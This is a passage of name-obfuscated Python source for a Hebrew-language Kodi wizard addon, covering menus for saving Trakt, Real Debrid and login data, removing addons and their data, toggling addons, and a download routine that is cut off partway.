	addFile ('%s שמירת נתיבי ספריות וידאו:  '%O000O000OOO0000O0 .replace ('true',OOOO0OO0O00000OO0 ).replace ('false',O0OOO0OO0O00O00O0 ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3166
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%OO0O0O0O0OO0O000O .replace ('true',OOOO0OO0O00000OO0 ).replace ('false',O0OOO0OO0O00O00O0 ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3167
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%OOO00O0O0O00O0O0O .replace ('true',OOOO0OO0O00000OO0 ).replace ('false',O0OOO0OO0O00O00O0 ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3169
	addFile ('%s שמירת פליליסט לאודר:  '%OO0OOO00OOOOOOO00 .replace ('true',OOOO0OO0O00000OO0 ).replace ('false',O0OOO0OO0O00O00O0 ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3170
	addFile ('%s שמירת הגדרות באפר: '%O000OOO00OOO0000O .replace ('true',OOOO0OO0O00000OO0 ).replace ('false',O0OOO0OO0O00O00O0 ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3175
	addFile ('%s שמירת רשימות ריפו:  '%OOO0OO00O0000O00O .replace ('true',OOOO0OO0O00000OO0 ).replace ('false',O0OOO0OO0O00O00O0 ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3177
	setView ('files','viewType')#line:3179
def traktMenu ():#line:3181
	O00O0O00O00OOO00O ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3182
	OO0O000O000OO000O =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3183
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3184
	addFile ('Save Trakt Data: %s'%O00O0O00O00OOO00O ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3185
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (OO0O000O000OO000O ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3186
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3187
	for O00O0O00O00OOO00O in traktit .ORDER :#line:3189
		OOO000OOOOO0OO0O0 =TRAKTID [O00O0O00O00OOO00O ]['name']#line:3190
		O00000OO0O0000O00 =TRAKTID [O00O0O00O00OOO00O ]['path']#line:3191
		O0O0O00000O0OOOO0 =TRAKTID [O00O0O00O00OOO00O ]['saved']#line:3192
		O0OOOO0O00000O000 =TRAKTID [O00O0O00O00OOO00O ]['file']#line:3193
		OOO000000OO00O000 =wiz .getS (O0O0O00000O0OOOO0 )#line:3194
		O0000O00O00OO00O0 =traktit .traktUser (O00O0O00O00OOO00O )#line:3195
		O00O0O000O00O0O0O =TRAKTID [O00O0O00O00OOO00O ]['icon']if os .path .exists (O00000OO0O0000O00 )else ICONTRAKT #line:3196
		OO0OO0O0000O0000O =TRAKTID [O00O0O00O00OOO00O ]['fanart']if os .path .exists (O00000OO0O0000O00 )else FANART #line:3197
		OO0OOOOOOOO00OO00 =createMenu ('saveaddon','Trakt',O00O0O00O00OOO00O )#line:3198
		OO00O0O0000O0O00O =createMenu ('save','Trakt',O00O0O00O00OOO00O )#line:3199
		OO0OOOOOOOO00OO00 .append ((THEME2 %'%s Settings'%OOO000OOOOO0OO0O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O00O0O00O00OOO00O )))#line:3200
		addFile ('[+]-> %s'%OOO000OOOOO0OO0O0 ,'',icon =O00O0O000O00O0O0O ,fanart =OO0OO0O0000O0000O ,themeit =THEME3 )#line:3202
		if not os .path .exists (O00000OO0O0000O00 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O00O0O000O00O0O0O ,fanart =OO0OO0O0000O0000O ,menu =OO0OOOOOOOO00OO00 )#line:3203
		elif not O0000O00O00OO00O0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O00O0O00O00OOO00O ,icon =O00O0O000O00O0O0O ,fanart =OO0OO0O0000O0000O ,menu =OO0OOOOOOOO00OO00 )#line:3204
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0000O00O00OO00O0 ,'authtrakt',O00O0O00O00OOO00O ,icon =O00O0O000O00O0O0O ,fanart =OO0OO0O0000O0000O ,menu =OO0OOOOOOOO00OO00 )#line:3205
		if OOO000000OO00O000 =="":#line:3206
			if os .path .exists (O0OOOO0O00000O000 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O00O0O00O00OOO00O ,icon =O00O0O000O00O0O0O ,fanart =OO0OO0O0000O0000O ,menu =OO00O0O0000O0O00O )#line:3207
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O00O0O00O00OOO00O ,icon =O00O0O000O00O0O0O ,fanart =OO0OO0O0000O0000O ,menu =OO00O0O0000O0O00O )#line:3208
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOO000000OO00O000 ,'',icon =O00O0O000O00O0O0O ,fanart =OO0OO0O0000O0000O ,menu =OO00O0O0000O0O00O )#line:3209
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3211
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3212
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3213
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3214
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3215
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3216
	setView ('files','viewType')#line:3217
def realMenu ():#line:3219
	OOOOO0OO0OO0000O0 ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3220
	OOOO0OO0000OO000O =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3221
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3222
	addFile ('Save Real Debrid Data: %s'%OOOOO0OO0OO0000O0 ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3223
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (OOOO0OO0000OO000O ),'',icon =ICONREAL ,themeit =THEME3 )#line:3224
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3225
	for OO0O00OO0O00O0OO0 in debridit .ORDER :#line:3227
		OO00000O0OO0OO00O =DEBRIDID [OO0O00OO0O00O0OO0 ]['name']#line:3228
		OOO0OO00O000OO0OO =DEBRIDID [OO0O00OO0O00O0OO0 ]['path']#line:3229
		O00000O0OO0000O00 =DEBRIDID [OO0O00OO0O00O0OO0 ]['saved']#line:3230
		O0OOOOO0OO000OOO0 =DEBRIDID [OO0O00OO0O00O0OO0 ]['file']#line:3231
		OOOOO0O00O000O00O =wiz .getS (O00000O0OO0000O00 )#line:3232
		OO0OOOOO0O0O0OO0O =debridit .debridUser (OO0O00OO0O00O0OO0 )#line:3233
		OOOO00OO0000OOOO0 =DEBRIDID [OO0O00OO0O00O0OO0 ]['icon']if os .path .exists (OOO0OO00O000OO0OO )else ICONREAL #line:3234
		O0O0O0OO0OO0OO00O =DEBRIDID [OO0O00OO0O00O0OO0 ]['fanart']if os .path .exists (OOO0OO00O000OO0OO )else FANART #line:3235
		OO00OO0O0OOOO0000 =createMenu ('saveaddon','Debrid',OO0O00OO0O00O0OO0 )#line:3236
		O00O0OO0O00O0OO00 =createMenu ('save','Debrid',OO0O00OO0O00O0OO0 )#line:3237
		OO00OO0O0OOOO0000 .append ((THEME2 %'%s Settings'%OO00000O0OO0OO00O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,OO0O00OO0O00O0OO0 )))#line:3238
		addFile ('[+]-> %s'%OO00000O0OO0OO00O ,'',icon =OOOO00OO0000OOOO0 ,fanart =O0O0O0OO0OO0OO00O ,themeit =THEME3 )#line:3240
		if not os .path .exists (OOO0OO00O000OO0OO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOO00OO0000OOOO0 ,fanart =O0O0O0OO0OO0OO00O ,menu =OO00OO0O0OOOO0000 )#line:3241
		elif not OO0OOOOO0O0O0OO0O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',OO0O00OO0O00O0OO0 ,icon =OOOO00OO0000OOOO0 ,fanart =O0O0O0OO0OO0OO00O ,menu =OO00OO0O0OOOO0000 )#line:3242
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0OOOOO0O0O0OO0O ,'authdebrid',OO0O00OO0O00O0OO0 ,icon =OOOO00OO0000OOOO0 ,fanart =O0O0O0OO0OO0OO00O ,menu =OO00OO0O0OOOO0000 )#line:3243
		if OOOOO0O00O000O00O =="":#line:3244
			if os .path .exists (O0OOOOO0OO000OOO0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',OO0O00OO0O00O0OO0 ,icon =OOOO00OO0000OOOO0 ,fanart =O0O0O0OO0OO0OO00O ,menu =O00O0OO0O00O0OO00 )#line:3245
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',OO0O00OO0O00O0OO0 ,icon =OOOO00OO0000OOOO0 ,fanart =O0O0O0OO0OO0OO00O ,menu =O00O0OO0O00O0OO00 )#line:3246
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOOOO0O00O000O00O ,'',icon =OOOO00OO0000OOOO0 ,fanart =O0O0O0OO0OO0OO00O ,menu =O00O0OO0O00O0OO00 )#line:3247
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3249
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3250
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3251
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3252
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3253
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3254
	setView ('files','viewType')#line:3255
def loginMenu ():#line:3257
	O000O0OO0OOO00OO0 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3258
	O0O000000000OO000 =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3259
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3260
	addFile ('Save Login Data: %s'%O000O0OO0OOO00OO0 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3261
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (O0O000000000OO000 ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3262
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3263
	for O000O0OO0OOO00OO0 in loginit .ORDER :#line:3265
		O0OOOO00OOO00OOOO =LOGINID [O000O0OO0OOO00OO0 ]['name']#line:3266
		O0O0O0O000OOOO00O =LOGINID [O000O0OO0OOO00OO0 ]['path']#line:3267
		O00000OO000O00O0O =LOGINID [O000O0OO0OOO00OO0 ]['saved']#line:3268
		O0000000OOOO0OO0O =LOGINID [O000O0OO0OOO00OO0 ]['file']#line:3269
		O0O0O00OO00O00OOO =wiz .getS (O00000OO000O00O0O )#line:3270
		OO0O00OO00O0OO0OO =loginit .loginUser (O000O0OO0OOO00OO0 )#line:3271
		O0O000O0O00OO00O0 =LOGINID [O000O0OO0OOO00OO0 ]['icon']if os .path .exists (O0O0O0O000OOOO00O )else ICONLOGIN #line:3272
		OO0OO0OO0OO0O0OO0 =LOGINID [O000O0OO0OOO00OO0 ]['fanart']if os .path .exists (O0O0O0O000OOOO00O )else FANART #line:3273
		OO0000O0O0O000000 =createMenu ('saveaddon','Login',O000O0OO0OOO00OO0 )#line:3274
		OO00O0OOO0OO00OO0 =createMenu ('save','Login',O000O0OO0OOO00OO0 )#line:3275
		OO0000O0O0O000000 .append ((THEME2 %'%s Settings'%O0OOOO00OOO00OOOO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,O000O0OO0OOO00OO0 )))#line:3276
		addFile ('[+]-> %s'%O0OOOO00OOO00OOOO ,'',icon =O0O000O0O00OO00O0 ,fanart =OO0OO0OO0OO0O0OO0 ,themeit =THEME3 )#line:3278
		if not os .path .exists (O0O0O0O000OOOO00O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0O000O0O00OO00O0 ,fanart =OO0OO0OO0OO0O0OO0 ,menu =OO0000O0O0O000000 )#line:3279
		elif not OO0O00OO00O0OO0OO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',O000O0OO0OOO00OO0 ,icon =O0O000O0O00OO00O0 ,fanart =OO0OO0OO0OO0O0OO0 ,menu =OO0000O0O0O000000 )#line:3280
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0O00OO00O0OO0OO ,'authlogin',O000O0OO0OOO00OO0 ,icon =O0O000O0O00OO00O0 ,fanart =OO0OO0OO0OO0O0OO0 ,menu =OO0000O0O0O000000 )#line:3281
		if O0O0O00OO00O00OOO =="":#line:3282
			if os .path .exists (O0000000OOOO0OO0O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',O000O0OO0OOO00OO0 ,icon =O0O000O0O00OO00O0 ,fanart =OO0OO0OO0OO0O0OO0 ,menu =OO00O0OOO0OO00OO0 )#line:3283
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',O000O0OO0OOO00OO0 ,icon =O0O000O0O00OO00O0 ,fanart =OO0OO0OO0OO0O0OO0 ,menu =OO00O0OOO0OO00OO0 )#line:3284
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O0O00OO00O00OOO ,'',icon =O0O000O0O00OO00O0 ,fanart =OO0OO0OO0OO0O0OO0 ,menu =OO00O0OOO0OO00OO0 )#line:3285
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3287
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3288
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3289
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3290
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3291
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3292
	setView ('files','viewType')#line:3293
def fixUpdate ():#line:3295
	if KODIV <17 :#line:3296
		OOOOOOO0O00OOO000 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3297
		try :#line:3298
			os .remove (OOOOOOO0O00OOO000 )#line:3299
		except Exception as O0O000OOOOO00O00O :#line:3300
			wiz .log ("Unable to remove %s, Purging DB"%OOOOOOO0O00OOO000 )#line:3301
			wiz .purgeDb (OOOOOOO0O00OOO000 )#line:3302
	else :#line:3303
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3304
def removeAddonMenu ():#line:3306
	OO0OOO00O0O0OOOO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3307
	O0OO000OOO0OO000O =[];O00OOOO0O00O0OOOO =[]#line:3308
	for O000OOO000O0000OO in sorted (OO0OOO00O0O0OOOO0 ,key =lambda OOO0000OOO0O0OOO0 :OOO0000OOO0O0OOO0 ):#line:3309
		O00OOO00O0OOOO000 =os .path .split (O000OOO000O0000OO [:-1 ])[1 ]#line:3310
		if O00OOO00O0OOOO000 in EXCLUDES :continue #line:3311
		elif O00OOO00O0OOOO000 in DEFAULTPLUGINS :continue #line:3312
		elif O00OOO00O0OOOO000 =='packages':continue #line:3313
		OOO000000OO00OOOO =os .path .join (O000OOO000O0000OO ,'addon.xml')#line:3314
		if os .path .exists (OOO000000OO00OOOO ):#line:3315
			O000OO000OO00OO0O =open (OOO000000OO00OOOO )#line:3316
			O0O0O00O00OOO0000 =O000OO000OO00OO0O .read ()#line:3317
			OOO000O0000OOO00O =wiz .parseDOM (O0O0O00O00OOO0000 ,'addon',ret ='id')#line:3318
			OO0O00000OOOOO000 =O00OOO00O0OOOO000 if len (OOO000O0000OOO00O )==0 else OOO000O0000OOO00O [0 ]#line:3320
			try :#line:3321
				OOOOO0O00O0000O00 =xbmcaddon .Addon (id =OO0O00000OOOOO000 )#line:3322
				O0OO000OOO0OO000O .append (OOOOO0O00O0000O00 .getAddonInfo ('name'))#line:3323
				O00OOOO0O00O0OOOO .append (OO0O00000OOOOO000 )#line:3324
			except :#line:3325
				pass #line:3326
	if len (O0OO000OOO0OO000O )==0 :#line:3327
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3328
		return #line:3329
	if KODIV >16 :#line:3330
		O0O000000OO0OO0O0 =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,O0OO000OOO0OO000O )#line:3331
	else :#line:3332
		O0O000000OO0OO0O0 =[];OOOOOO00OOO0OO00O =0 #line:3333
		O0OO00O0000OO0OO0 =["-- Click here to Continue --"]+O0OO000OOO0OO000O #line:3334
		while not OOOOOO00OOO0OO00O ==-1 :#line:3335
			OOOOOO00OOO0OO00O =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,O0OO00O0000OO0OO0 )#line:3336
			if OOOOOO00OOO0OO00O ==-1 :break #line:3337
			elif OOOOOO00OOO0OO00O ==0 :break #line:3338
			else :#line:3339
				OOOOOOOOO0O0OOO00 =(OOOOOO00OOO0OO00O -1 )#line:3340
				if OOOOOOOOO0O0OOO00 in O0O000000OO0OO0O0 :#line:3341
					O0O000000OO0OO0O0 .remove (OOOOOOOOO0O0OOO00 )#line:3342
					O0OO00O0000OO0OO0 [OOOOOO00OOO0OO00O ]=O0OO000OOO0OO000O [OOOOOOOOO0O0OOO00 ]#line:3343
				else :#line:3344
					O0O000000OO0OO0O0 .append (OOOOOOOOO0O0OOO00 )#line:3345
					O0OO00O0000OO0OO0 [OOOOOO00OOO0OO00O ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O0OO000OOO0OO000O [OOOOOOOOO0O0OOO00 ])#line:3346
	if O0O000000OO0OO0O0 ==None :return #line:3347
	if len (O0O000000OO0OO0O0 )>0 :#line:3348
		wiz .addonUpdates ('set')#line:3349
		for OOO0OOOO00O000O0O in O0O000000OO0OO0O0 :#line:3350
			removeAddon (O00OOOO0O00O0OOOO [OOO0OOOO00O000O0O ],O0OO000OOO0OO000O [OOO0OOOO00O000O0O ],True )#line:3351
		xbmc .sleep (1000 )#line:3353
		if INSTALLMETHOD ==1 :OOOOOOOOOO000OOO0 =1 #line:3355
		elif INSTALLMETHOD ==2 :OOOOOOOOOO000OOO0 =0 #line:3356
		else :OOOOOOOOOO000OOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3357
		if OOOOOOOOOO000OOO0 ==1 :wiz .reloadFix ('remove addon')#line:3358
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3359
def removeAddonDataMenu ():#line:3361
	if os .path .exists (ADDOND ):#line:3362
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3363
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3364
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3365
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3366
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3367
		OO0000O0OOO0O0OO0 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3368
		for O00O0000OO00O00OO in sorted (OO0000O0OOO0O0OO0 ,key =lambda O000OOO00000OO0O0 :O000OOO00000OO0O0 ):#line:3369
			OOO00000OO00OOO0O =O00O0000OO00O00OO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3370
			OO00OO00O0OOO0O0O =os .path .join (O00O0000OO00O00OO .replace (ADDOND ,ADDONS ),'icon.png')#line:3371
			O0O0O0O0OO00OOOOO =os .path .join (O00O0000OO00O00OO .replace (ADDOND ,ADDONS ),'fanart.png')#line:3372
			O00O00O0O000O0000 =OOO00000OO00OOO0O #line:3373
			OOO0O000O0000O0OO ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3374
			for O0O000OOO0000O00O in OOO0O000O0000O0OO :#line:3375
				O00O00O0O000O0000 =O00O00O0O000O0000 .replace (O0O000OOO0000O00O ,OOO0O000O0000O0OO [O0O000OOO0000O00O ])#line:3376
			if OOO00000OO00OOO0O in EXCLUDES :O00O00O0O000O0000 ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%O00O00O0O000O0000 #line:3377
			else :O00O00O0O000O0000 ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%O00O00O0O000O0000 #line:3378
			addFile (' %s'%O00O00O0O000O0000 ,'removedata',OOO00000OO00OOO0O ,icon =OO00OO00O0OOO0O0O ,fanart =O0O0O0O0OO00OOOOO ,themeit =THEME2 )#line:3379
	else :#line:3380
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3381
	setView ('files','viewType')#line:3382
def enableAddons ():#line:3384
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3385
	OO0OO00OOO00OO0O0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3386
	O0OOOO000OOOO000O =0 #line:3387
	for OO00OO0OO0OO000OO in sorted (OO0OO00OOO00OO0O0 ,key =lambda O000O0OOOO0000OOO :O000O0OOOO0000OOO ):#line:3388
		O0OOOO00OO0O000OO =os .path .split (OO00OO0OO0OO000OO [:-1 ])[1 ]#line:3389
		if O0OOOO00OO0O000OO in EXCLUDES :continue #line:3390
		if O0OOOO00OO0O000OO in DEFAULTPLUGINS :continue #line:3391
		OO0O0O000OOOOOO00 =os .path .join (OO00OO0OO0OO000OO ,'addon.xml')#line:3392
		if os .path .exists (OO0O0O000OOOOOO00 ):#line:3393
			O0OOOO000OOOO000O +=1 #line:3394
			OO0OO00OOO00OO0O0 =OO00OO0OO0OO000OO .replace (ADDONS ,'')[1 :-1 ]#line:3395
			O00O000OO0OO000OO =open (OO0O0O000OOOOOO00 )#line:3396
			O0OO00O00OO0OO000 =O00O000OO0OO000OO .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3397
			OOOOO0000O00O0000 =wiz .parseDOM (O0OO00O00OO0OO000 ,'addon',ret ='id')#line:3398
			OOO00O000OOOOOOO0 =wiz .parseDOM (O0OO00O00OO0OO000 ,'addon',ret ='name')#line:3399
			try :#line:3400
				OOO0OO0000O00OOO0 =OOOOO0000O00O0000 [0 ]#line:3401
				OOO0OOOO0OOO00O0O =OOO00O000OOOOOOO0 [0 ]#line:3402
			except :#line:3403
				continue #line:3404
			try :#line:3405
				O0OOOOO00OO000O0O =xbmcaddon .Addon (id =OOO0OO0000O00OOO0 )#line:3406
				O000OO0OO0OOO0OOO ="[COLOR green][Enabled][/COLOR]"#line:3407
				OO0O00O0OOOO0OO00 ="false"#line:3408
			except :#line:3409
				O000OO0OO0OOO0OOO ="[COLOR red][Disabled][/COLOR]"#line:3410
				OO0O00O0OOOO0OO00 ="true"#line:3411
				pass #line:3412
			OO0000O0O000O0OOO =os .path .join (OO00OO0OO0OO000OO ,'icon.png')if os .path .exists (os .path .join (OO00OO0OO0OO000OO ,'icon.png'))else ICON #line:3413
			O0O0OOOOO0OOO0000 =os .path .join (OO00OO0OO0OO000OO ,'fanart.jpg')if os .path .exists (os .path .join (OO00OO0OO0OO000OO ,'fanart.jpg'))else FANART #line:3414
			addFile ("%s %s"%(O000OO0OO0OOO0OOO ,OOO0OOOO0OOO00O0O ),'toggleaddon',OO0OO00OOO00OO0O0 ,OO0O00O0OOOO0OO00 ,icon =OO0000O0O000O0OOO ,fanart =O0O0OOOOO0OOO0000 )#line:3415
			O00O000OO0OO000OO .close ()#line:3416
	if O0OOOO000OOOO000O ==0 :#line:3417
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3418
	setView ('files','viewType')#line:3419
def changeFeq ():#line:3421
	OO00OOO0OOO00OO0O =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3422
	OOO0O0OO00O00OOOO =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OO00OOO0OOO00OO0O )#line:3423
	if not OOO0O0OO00O00OOOO ==-1 :#line:3424
		wiz .setS ('autocleanfeq',str (OOO0O0OO00O00OOOO ))#line:3425
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OO00OOO0OOO00OO0O [OOO0O0OO00O00OOOO ]))#line:3426
def developer ():#line:3428
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3429
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3430
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3431
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3432
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3433
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3434
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3435
	setView ('files','viewType')#line:3437
def download (O000O0OOO0O0OO00O ,O0OO0O00OO000O0OO ):#line:3442
  OO0000OO00OO000OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3443
  O0000OOOO0OO0000O =xbmcgui .DialogProgress ()#line:3444
  O0000OOOO0OO0000O .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3445
  OO0O0OOOOO0OOOO0O =os .path .join (OO0000OO00OO000OO ,'isr.zip')#line:3446
  O00OO0O00OO000O00 =urllib2 .Request (O000O0OOO0O0OO00O )#line:3447
  OO0OO00OO00OOO0O0 =urllib2 .urlopen (O00OO0O00OO000O00 )#line:3448
  OOO00O0O00O00O00O =xbmcgui .DialogProgress ()#line:3450
  OOO00O0O00O00O00O .create ("Downloading","Downloading "+name )#line:3451
  OOO00O0O00O00O00O .update (0 )#line:3452
  O0O00OO0O0O0O0O00 =O0OO0O00OO000O0OO #line:3453
  O000O00O000OO00O0 =open (OO0O0OOOOO0OOOO0O ,'wb')#line:3454
  try :#line:3456
    O0OOOOO000OOOO00O =OO0OO00OO00OOO0O0 .info ().getheader ('Content-Length').strip ()#line:3457
    O00000OO0OO0OOO00 =True #line:3458
  except AttributeError :#line:3459
        O00000OO0OO0OOO00 =False #line:3460
  if O00000OO0OO0OOO00 :#line:3462
        O0OOOOO000OOOO00O =int (O0OOOOO000OOOO00O )#line:3463
  OOOOOO0O0O000OO0O =0 #line:3465
  O0OO00OOOO00O000O =time .time ()#line:3466
  while True :#line:3467
        OOOOOOO0O00O00O0O =OO0OO00OO00OOO0O0 .read (8192 )#line:3468
        if not OOOOOOO0O00O00O0O :#line:3469
            sys .stdout .write ('\n')#line:3470
            break #line:3471
        OOOOOO0O0O000OO0O +=len (OOOOOOO0O00O00O0O )#line:3473
        O000O00O000OO00O0 .write (OOOOOOO0O00O00O0O )#line:3474
        if not O00000OO0OO0OOO00 :#line:3476
            O0OOOOO000OOOO00O =OOOOOO0O0O000OO0O #line:3477
        if OOO00O0O00O00O00O .iscanceled ():#line:3478
           OOO00O0O00O00O00O .close ()#line:3479
           try :#line:3480
            os .remove (OO0O0OOOOO0OOOO0O )#line:3481
           except :#line:3482
